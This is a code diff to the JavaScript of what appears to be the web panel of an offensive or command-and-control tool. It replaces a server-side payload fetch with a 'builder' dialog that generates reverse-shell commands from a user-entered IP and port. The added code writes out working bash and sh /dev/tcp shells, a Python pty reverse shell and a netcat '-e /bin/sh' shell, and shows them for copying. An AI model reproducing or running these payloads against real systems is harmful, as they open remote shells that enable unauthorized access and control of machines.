@@ -20,13 +20,42 @@ async function login() {
 /* ------------------------------
    Builder menu
 --------------------------------*/
-async function build(lang){
-    let ip="10.0.0.1"
-    let port="4444"
-    let r = await fetch(`/api/builder?lang=${lang}&ip=${ip}&port=${port}`)
-    let txt = await r.text()
-    document.getElementById("payloadbox").value = txt
-}
+const dialog = document.getElementById("builderDialog");
+
+document.getElementById("builderBtn").onclick = () => {
+  dialog.showModal();
+};
+
+document.getElementById("closeBuilder").onclick = () => {
+  dialog.close();
+};
+
+document.getElementById("createShell").onclick = () => {
+
+  const ip = document.getElementById("builderIp").value;
+  const port = document.getElementById("builderPort").value;
+  const script = document.getElementById("builderScript").value;
+
+  let cmd = "";
+
+  if (script === "bash") {
+    cmd = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
+  }
+
+  if (script === "sh") {
+    cmd = `sh -i >& /dev/tcp/${ip}/${port} 0>&1`;
+  }
+
+  if (script === "python") {
+    cmd = `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'`;
+  }
+
+  if (script === "nc") {
+    cmd = `nc ${ip} ${port} -e /bin/sh`;
+  }
+
+  document.getElementById("shellOutput").textContent = cmd;
+};
 
 /* ------------------------------
    Status strip
